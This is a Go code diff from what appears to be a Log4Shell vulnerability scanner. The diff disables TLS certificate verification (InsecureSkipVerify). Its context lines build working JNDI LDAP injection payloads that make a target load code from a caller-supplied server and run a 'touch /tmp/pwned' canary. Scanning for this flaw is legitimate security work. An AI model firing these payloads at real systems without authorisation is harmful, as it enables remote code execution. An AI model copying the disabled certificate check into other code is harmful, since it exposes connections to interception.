@@ -1,6 +1,7 @@
 package cmd
 
 import (
+	"crypto/tls"
 	"fmt"
 	"net"
 	"net/http"
@@ -21,8 +22,10 @@ func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan
 			TLSHandshakeTimeout:   1 * time.Second,
 			ResponseHeaderTimeout: 1 * time.Second,
 			ExpectContinueTimeout: 1 * time.Second,
+			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
 		},
 	}
+
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
 	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
 	log.Debugf("Target URL: %s", targetUrl)
